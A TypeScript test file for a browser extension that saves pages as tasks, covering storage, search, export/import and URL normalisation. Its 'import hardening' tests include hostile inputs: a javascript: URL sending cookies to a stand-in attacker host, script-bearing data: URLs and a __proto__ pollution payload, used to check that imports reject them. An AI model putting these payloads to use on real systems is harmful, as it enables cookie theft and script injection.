import { beforeEach, describe, expect, it } from 'vitest';
import { createFakeStorage } from './fakeStorage';
import { setStorageArea, taskKey } from '../src/lib/storage';
import {
  countPending,
  createTask,
  deleteTask,
  exportAll,
  findByUrl,
  getSettings,
  getTask,
  importBundle,
  listTasks,
  purgeExpiredTrash,
  queryTasks,
  restoreTask,
  setCompleted,
  tasksForView,
  TRASH_RETENTION_DAYS,
  updateTask,
  ValidationError,
} from '../src/lib/tasks';
import { statusOf, Task } from '../src/lib/types';
import { isSavableUrl, displayUrl, normalizeUrl } from '../src/lib/url';

let storage: ReturnType<typeof createFakeStorage>;

beforeEach(() => {
  storage = createFakeStorage();
  setStorageArea(storage);
});

const sample = (overrides: Partial<Parameters<typeof createTask>[0]> = {}) => ({
  title: 'Apply to Acme',
  url: 'https://example.com/jobs/42',
  pageTitle: 'Senior Engineer — Acme',
  nextAction: 'Submit before Friday',
  ...overrides,
});

describe('createTask', () => {
  it('saves a task and reads it back', async () => {
    const task = await createTask(sample());
    expect(await getTask(task.id)).toEqual(task);
    expect(statusOf(task)).toBe('pending');
  });

  it('writes each task under its own key so concurrent saves cannot clobber', async () => {
    const [a, b] = await Promise.all([
      createTask(sample({ title: 'A', url: 'https://a.test' })),
      createTask(sample({ title: 'B', url: 'https://b.test' })),
    ]);

    const keys = Object.keys(storage.dump());
    expect(keys).toContain(taskKey(a.id));
    expect(keys).toContain(taskKey(b.id));
    expect(await listTasks()).toHaveLength(2);
  });

  it('falls back to the page title, then the url, when no title is given', async () => {
    const withPage = await createTask(sample({ title: '   ' }));
    expect(withPage.title).toBe('Senior Engineer — Acme');

    const bare = await createTask({ title: '', url: 'https://x.test/a', pageTitle: '' });
    expect(bare.title).toBe('https://x.test/a');
  });

  it('rejects a task with no url', async () => {
    await expect(createTask(sample({ url: '  ' }))).rejects.toBeInstanceOf(ValidationError);
  });

  it('trims and caps oversized input', async () => {
    const task = await createTask(sample({ title: `  ${'x'.repeat(400)}  ` }));
    expect(task.title).toHaveLength(300);
  });
});

describe('completion', () => {
  it('derives status from completedAt in both directions', async () => {
    const task = await createTask(sample());

    const done = await setCompleted(task.id, true);
    expect(statusOf(done)).toBe('done');
    expect(done.completedAt).toBeTypeOf('number');

    const reopened = await setCompleted(task.id, false);
    expect(statusOf(reopened)).toBe('pending');
    expect(reopened.completedAt).toBeNull();
  });

  it('persists completion across a fresh read', async () => {
    const task = await createTask(sample());
    await setCompleted(task.id, true);
    const fromStorage = await getTask(task.id);
    expect(statusOf(fromStorage!)).toBe('done');
  });
});

describe('editing', () => {
  it('applies a partial patch and leaves other fields alone', async () => {
    const task = await createTask(sample());
    const updated = await updateTask(task.id, { nextAction: 'Follow up Monday' });

    expect(updated.nextAction).toBe('Follow up Monday');
    expect(updated.title).toBe(task.title);
    expect(updated.url).toBe(task.url);
    expect(updated.updatedAt).toBeGreaterThanOrEqual(task.updatedAt);
  });

  it('refuses to edit a task that is gone', async () => {
    await expect(updateTask('missing', { title: 'x' })).rejects.toBeInstanceOf(ValidationError);
  });

  it('accepts a new url that passes the allowlist', async () => {
    const task = await createTask(sample());
    const updated = await updateTask(task.id, { url: 'https://example.com/jobs/43' });
    expect(updated.url).toBe('https://example.com/jobs/43');
  });

  it('refuses a url the allowlist rejects, leaving the stored task untouched', async () => {
    const task = await createTask(sample());
    await expect(updateTask(task.id, { url: 'javascript:alert(1)' })).rejects.toBeInstanceOf(
      ValidationError,
    );
    expect((await getTask(task.id))!.url).toBe(task.url);
  });

  it('keeps the existing url when patched with a blank one', async () => {
    const task = await createTask(sample());
    const updated = await updateTask(task.id, { url: '   ' });
    expect(updated.url).toBe(task.url);
  });
});

describe('soft delete', () => {
  it('hides deleted tasks from the default list but keeps them recoverable', async () => {
    const task = await createTask(sample());
    await deleteTask(task.id);

    expect(await listTasks()).toHaveLength(0);
    expect(await listTasks({ includeDeleted: true })).toHaveLength(1);

    await restoreTask(task.id);
    expect(await listTasks()).toHaveLength(1);
  });

  it('purges trash only after the retention window', async () => {
    const stale = await createTask(sample({ url: 'https://old.test' }));
    const fresh = await createTask(sample({ url: 'https://new.test' }));
    await deleteTask(stale.id);
    await deleteTask(fresh.id);

    // Backdate one deletion past the cutoff.
    const record = (await getTask(stale.id))!;
    await storage.set({
      [taskKey(stale.id)]: {
        ...record,
        deletedAt: Date.now() - (TRASH_RETENTION_DAYS + 1) * 24 * 60 * 60 * 1000,
      },
    });

    expect(await purgeExpiredTrash()).toBe(1);
    const remaining = await listTasks({ includeDeleted: true });
    expect(remaining.map((t) => t.id)).toEqual([fresh.id]);
  });
});

describe('queryTasks', () => {
  const make = (overrides: Partial<Task>): Task => ({
    id: Math.random().toString(36),
    title: 'Task',
    url: 'https://example.com',
    pageTitle: 'Page',
    faviconUrl: null,
    nextAction: '',
    notes: '',
    createdAt: 1000,
    updatedAt: 1000,
    completedAt: null,
    deletedAt: null,
    ...overrides,
  });

  it('filters by status', () => {
    const tasks = [make({ title: 'open' }), make({ title: 'closed', completedAt: 2000 })];
    expect(queryTasks(tasks, { status: 'pending' }).map((t) => t.title)).toEqual(['open']);
    expect(queryTasks(tasks, { status: 'done' }).map((t) => t.title)).toEqual(['closed']);
  });

  it('searches across title, action, page title, notes and url', () => {
    const tasks = [
      make({ title: 'Apply to Acme' }),
      make({ title: 'Read', nextAction: 'finish chapter 3' }),
      make({ title: 'Compare', pageTitle: 'Widget Pro review' }),
      make({ title: 'Debug', notes: 'check the retry logic' }),
      make({ title: 'Docs', url: 'https://developer.chrome.com/docs' }),
    ];

    expect(queryTasks(tasks, { search: 'acme' })).toHaveLength(1);
    expect(queryTasks(tasks, { search: 'chapter' })).toHaveLength(1);
    expect(queryTasks(tasks, { search: 'widget' })).toHaveLength(1);
    expect(queryTasks(tasks, { search: 'retry' })).toHaveLength(1);
    expect(queryTasks(tasks, { search: 'chrome.com' })).toHaveLength(1);
  });

  it('is case insensitive and ignores surrounding whitespace', () => {
    const tasks = [make({ title: 'Apply to Acme' })];
    expect(queryTasks(tasks, { search: '  ACME  ' })).toHaveLength(1);
  });

  it('sorts newest or oldest first', () => {
    const tasks = [make({ title: 'old', createdAt: 1 }), make({ title: 'new', createdAt: 9 })];
    expect(queryTasks(tasks, { sort: 'newest' }).map((t) => t.title)).toEqual(['new', 'old']);
    expect(queryTasks(tasks, { sort: 'oldest' }).map((t) => t.title)).toEqual(['old', 'new']);
  });

  it('does not mutate the input array', () => {
    const tasks = [make({ title: 'a', createdAt: 1 }), make({ title: 'b', createdAt: 9 })];
    const before = tasks.map((t) => t.title);
    queryTasks(tasks, { sort: 'newest' });
    expect(tasks.map((t) => t.title)).toEqual(before);
  });
});

describe('findByUrl', () => {
  it('flags a duplicate save but ignores trashed tasks', async () => {
    const task = await createTask(sample());
    const all = await listTasks();
    expect(findByUrl(all, task.url)?.id).toBe(task.id);

    await deleteTask(task.id);
    expect(findByUrl(await listTasks({ includeDeleted: true }), task.url)).toBeUndefined();
  });
});

describe('export and import', () => {
  it('round-trips tasks through an export bundle', async () => {
    await createTask(sample());
    await createTask(sample({ url: 'https://second.test', title: 'Second' }));

    const bundle = await exportAll();
    expect(bundle.tasks).toHaveLength(2);

    await storage.clear();
    const imported = await importBundle(bundle);
    expect(imported).toBe(2);

    const titles = (await listTasks()).map((t) => t.title).sort();
    expect(titles).toEqual(['Apply to Acme', 'Second']);
  });

  it('assigns fresh ids on import so a re-import never overwrites', async () => {
    const original = await createTask(sample());
    const bundle = await exportAll();
    await importBundle(bundle);

    const all = await listTasks();
    expect(all).toHaveLength(2);
    expect(new Set(all.map((t) => t.id)).size).toBe(2);
    expect(all.some((t) => t.id === original.id)).toBe(true);
  });

  it('rejects a file that is not an export bundle', async () => {
    await expect(importBundle({ nope: true })).rejects.toBeInstanceOf(ValidationError);
  });
});

describe('url helpers', () => {
  it('accepts normal pages and rejects browser-internal ones', () => {
    expect(isSavableUrl('https://example.com')).toBe(true);
    expect(isSavableUrl('http://localhost:3000/app')).toBe(true);
    expect(isSavableUrl('chrome://extensions')).toBe(false);
    expect(isSavableUrl('chrome-extension://abc/popup.html')).toBe(false);
    expect(isSavableUrl('about:blank')).toBe(false);
    expect(isSavableUrl('devtools://devtools/bundled/x.html')).toBe(false);
    expect(isSavableUrl('')).toBe(false);
    expect(isSavableUrl(undefined)).toBe(false);
    expect(isSavableUrl('not a url')).toBe(false);
  });

  it('shortens urls for display', () => {
    expect(displayUrl('https://www.github.com/foo/bar/')).toBe('github.com/foo/bar');
    expect(displayUrl('https://example.com/')).toBe('example.com');
  });
});

describe('import hardening', () => {
  // An export file is attacker-controlled: users can be talked into importing
  // "their backup" from anywhere. Every field must be rebuilt, never spread.

  it('drops tasks pointing at dangerous schemes', async () => {
    const hostile = {
      tasks: [
        { id: 'x1', title: 'Click me', url: 'javascript:fetch("//evil.test?c="+document.cookie)' },
        { id: 'x2', title: 'Data', url: 'data:text/html,<script>alert(1)</script>' },
        { id: 'x3', title: 'Blob', url: 'blob:https://evil.test/abc' },
        { id: 'x4', title: 'Internal', url: 'chrome://settings' },
        { id: 'x5', title: 'Ext', url: 'chrome-extension://abc/popup.html' },
        { id: 'ok', title: 'Fine', url: 'https://example.com/real' },
      ],
    };

    expect(await importBundle(hostile)).toBe(1);
    const stored = await listTasks();
    expect(stored).toHaveLength(1);
    expect(stored[0]!.url).toBe('https://example.com/real');
  });

  it('never trusts an imported faviconUrl', async () => {
    await importBundle({
      tasks: [
        {
          id: 'x',
          title: 'Tracked',
          url: 'https://example.com/a',
          faviconUrl: 'https://tracker.evil.test/pixel.gif?u=victim',
        },
      ],
    });

    const [task] = await listTasks();
    expect(task!.faviconUrl).not.toContain('evil.test');
    // Recomputed from the URL, so it can only point at Chrome's local cache.
    expect(task!.faviconUrl).toContain('/_favicon/');
  });

  it('ignores unknown keys instead of copying them into storage', async () => {
    await importBundle({
      tasks: [
        {
          id: 'x',
          title: 'Sneaky',
          url: 'https://example.com/a',
          isAdmin: true,
          onclick: 'alert(1)',
        },
      ],
    });

    const [task] = await listTasks();
    expect(task).not.toHaveProperty('isAdmin');
    expect(task).not.toHaveProperty('onclick');
  });

  it('does not let a __proto__ key pollute Object.prototype', async () => {
    const payload = JSON.parse(
      '{"tasks":[{"id":"x","title":"P","url":"https://example.com/a","__proto__":{"polluted":"yes"}}]}',
    );
    await importBundle(payload);

    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    expect(Object.prototype).not.toHaveProperty('polluted');
  });

  it('coerces non-numeric timestamps rather than storing them', async () => {
    await importBundle({
      tasks: [
        {
          id: 'x',
          title: 'Bad dates',
          url: 'https://example.com/a',
          createdAt: 'not-a-number',
          completedAt: NaN,
          deletedAt: {},
        },
      ],
    });

    const [task] = await listTasks();
    expect(typeof task!.createdAt).toBe('number');
    expect(Number.isFinite(task!.createdAt)).toBe(true);
    expect(task!.completedAt).toBeNull();
    expect(task!.deletedAt).toBeNull();
  });
});

describe('settings hardening', () => {
  it('falls back to defaults for unrecognised values', async () => {
    await storage.set({
      settings: { theme: 'evil-class-name', sort: 'DROP TABLE', extra: 'ignored' },
    });

    const settings = await getSettings();
    expect(settings.theme).toBe('system');
    expect(settings.sort).toBe('newest');
    expect(settings).not.toHaveProperty('extra');
  });
});

describe('url allowlist', () => {
  it('permits only http, https and file', () => {
    expect(isSavableUrl('https://example.com')).toBe(true);
    expect(isSavableUrl('http://localhost:3000/app')).toBe(true);
    expect(isSavableUrl('file:///C:/notes.html')).toBe(true);

    expect(isSavableUrl('javascript:alert(1)')).toBe(false);
    expect(isSavableUrl('data:text/html,<script>')).toBe(false);
    expect(isSavableUrl('blob:https://x.test/a')).toBe(false);
    expect(isSavableUrl('vbscript:msgbox')).toBe(false);
    expect(isSavableUrl('chrome://extensions')).toBe(false);
    expect(isSavableUrl('ftp://files.test/a')).toBe(false);
  });

  it('rejects non-strings and oversized input', () => {
    expect(isSavableUrl(null)).toBe(false);
    expect(isSavableUrl(undefined)).toBe(false);
    expect(isSavableUrl(42)).toBe(false);
    expect(isSavableUrl({})).toBe(false);
    expect(isSavableUrl('https://example.com/' + 'a'.repeat(3000))).toBe(false);
  });
});

describe('normalizeUrl', () => {
  it('treats tracking-tagged links as the same page', () => {
    const plain = 'https://example.com/article';
    expect(normalizeUrl('https://example.com/article?utm_source=newsletter&utm_medium=email'))
      .toBe(normalizeUrl(plain));
    expect(normalizeUrl('https://example.com/article?fbclid=abc123')).toBe(normalizeUrl(plain));
    expect(normalizeUrl('https://example.com/article?gclid=xyz')).toBe(normalizeUrl(plain));
  });

  it('ignores www, trailing slashes, fragments and param order', () => {
    const base = normalizeUrl('https://example.com/docs');
    expect(normalizeUrl('https://www.example.com/docs')).toBe(base);
    expect(normalizeUrl('https://example.com/docs/')).toBe(base);
    expect(normalizeUrl('https://example.com/docs#section-2')).toBe(base);
    expect(normalizeUrl('https://example.com/search?b=2&a=1')).toBe(
      normalizeUrl('https://example.com/search?a=1&b=2'),
    );
  });

  it('keeps parameters that actually identify content', () => {
    // Dropping these would reopen the wrong page.
    expect(normalizeUrl('https://youtube.com/watch?v=abc')).not.toBe(
      normalizeUrl('https://youtube.com/watch?v=def'),
    );
    expect(normalizeUrl('https://example.com/issues?id=42')).not.toBe(
      normalizeUrl('https://example.com/issues?id=43'),
    );
  });

  it('distinguishes genuinely different pages', () => {
    expect(normalizeUrl('https://example.com/a')).not.toBe(normalizeUrl('https://example.com/b'));
    expect(normalizeUrl('https://a.test/x')).not.toBe(normalizeUrl('https://b.test/x'));
  });
});

describe('duplicate detection', () => {
  it('matches a page saved earlier without its tracking tail', async () => {
    await createTask(sample({ url: 'https://example.com/jobs/42' }));
    const all = await listTasks();

    expect(findByUrl(all, 'https://example.com/jobs/42?utm_source=twitter')).toBeDefined();
    expect(findByUrl(all, 'https://www.example.com/jobs/42/')).toBeDefined();
    expect(findByUrl(all, 'https://example.com/jobs/43')).toBeUndefined();
  });
});

describe('countPending', () => {
  it('counts only open, untrashed tasks', async () => {
    const open = await createTask(sample({ url: 'https://a.test' }));
    const done = await createTask(sample({ url: 'https://b.test' }));
    const gone = await createTask(sample({ url: 'https://c.test' }));
    await setCompleted(done.id, true);
    await deleteTask(gone.id);

    expect(countPending(await listTasks({ includeDeleted: true }))).toBe(1);
    expect(open.completedAt).toBeNull();
  });

  it('is zero for an empty list', () => {
    expect(countPending([])).toBe(0);
  });
});

describe('tasksForView', () => {
  const make = (overrides: Partial<Task>): Task => ({
    id: Math.random().toString(36),
    title: 'Task',
    url: 'https://example.com',
    pageTitle: 'Page',
    faviconUrl: null,
    nextAction: '',
    notes: '',
    createdAt: 1000,
    updatedAt: 1000,
    completedAt: null,
    deletedAt: null,
    ...overrides,
  });

  const tasks = [
    make({ title: 'open', createdAt: 1 }),
    make({ title: 'closed', completedAt: 2000, createdAt: 2 }),
    make({ title: 'trashed open', deletedAt: 3000, createdAt: 3 }),
    make({ title: 'trashed closed', completedAt: 2000, deletedAt: 3000, createdAt: 4 }),
  ];
  const titles = (list: Task[]) => list.map((t) => t.title);

  it('keeps trashed tasks out of To do and Done', () => {
    expect(titles(tasksForView(tasks, 'pending'))).toEqual(['open']);
    expect(titles(tasksForView(tasks, 'done'))).toEqual(['closed']);
  });

  it('shows every trashed task in Trash, completed or not', () => {
    expect(titles(tasksForView(tasks, 'trash'))).toEqual(['trashed closed', 'trashed open']);
  });

  it('applies search and sort within the view', () => {
    expect(titles(tasksForView(tasks, 'trash', { search: 'closed' }))).toEqual(['trashed closed']);
    expect(titles(tasksForView(tasks, 'trash', { sort: 'oldest' }))).toEqual([
      'trashed open',
      'trashed closed',
    ]);
  });
});
